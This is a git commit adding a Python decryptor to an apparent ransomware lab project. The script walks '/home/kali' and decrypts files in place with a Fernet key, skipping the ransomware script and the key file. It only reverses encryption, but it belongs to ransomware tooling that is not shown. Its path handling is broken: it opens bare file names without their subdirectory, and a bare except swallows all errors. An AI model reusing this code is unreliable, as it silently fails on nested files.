4c90701e17149c301f0c5a9bee65e3624a5b29f5
xchin02 <83194359+xchin02@users.noreply.github.com>
2022-07-10 20:15:10 +0800

    Create decrypt.py

---
+++ Ransomware/decrypt.py
@@ -0,0 +1,21 @@
+import os
+from cryptography.fernet import Fernet
+
+main_dir = "/home/kali"
+
+with open("encrypt.key", "rb") as key:
+    decrypt_key = key.read()
+
+for subdir, dirs, files in os.walk(main_dir):
+    for file in files:
+        if file == "ransomware.py" or file == "decrypt.py" or file == "encrypt.key":
+            continue
+        else:
+            try:
+                with open(file, "rb") as usrFile:
+                    contents = usrFile.read()
+                encrypted_content = Fernet(decrypt_key).decrypt(contents)
+                with open(file, "wb") as usrFile:
+                    usrFile.write(encrypted_content)
+            except:
+                pass
